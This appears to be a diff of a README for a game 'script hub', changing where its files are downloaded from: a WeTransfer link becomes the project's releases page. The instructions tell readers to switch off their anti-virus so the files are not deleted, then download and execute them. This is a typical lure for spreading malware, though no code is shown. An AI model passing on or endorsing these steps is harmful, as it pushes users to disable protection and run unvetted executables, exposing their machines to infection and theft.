@@ -4,7 +4,7 @@ This is a script hub with 2 game scripts later is it more and it is a good ui.
 ## DOWNLOAD INFO
 ````
 1. Set you anti-virus off or the files are gonna get deleted.
-2. Go to this link [(https://we.tl/t-nKHuAPIi9y)] and click on download.
+2. Go to releases and download the files there (.zip).
 3. Open it and download the files.
 4. DONE AND EXECUTE THE FILES!!!!!
 ````
